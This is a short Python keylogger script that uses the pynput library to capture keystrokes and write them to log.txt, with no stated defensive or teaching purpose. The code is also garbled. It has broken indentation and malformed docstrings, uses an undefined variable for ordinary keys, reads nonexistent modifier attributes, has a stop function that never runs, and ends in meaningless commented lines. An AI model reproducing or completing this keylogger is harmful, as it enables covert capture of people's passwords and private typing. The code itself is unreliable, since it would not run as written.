import pynput
from pynput.keyboard import Key, Listener
with open('log.txt', 'w') as log:
    def on_press(key):
        '''' Write a line of text to the file ''' 
        if key:
            if isinstance(key, Key):
                text = str(key)
        if len(text) > 0 and not key.alt and not key.shift and not key.ctrl:
                    log.write(text + '\n')

def on_release(key):
    '''' stop listening for keyboard events after the specified duration '''
        # do nothing if there is no keyboard events
    def stop_listening():
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
# import pynput.mouse.keyboard.Listener as li
# li = li.Listener(lambda key: "w") 
# li = Listener(timeout=1)

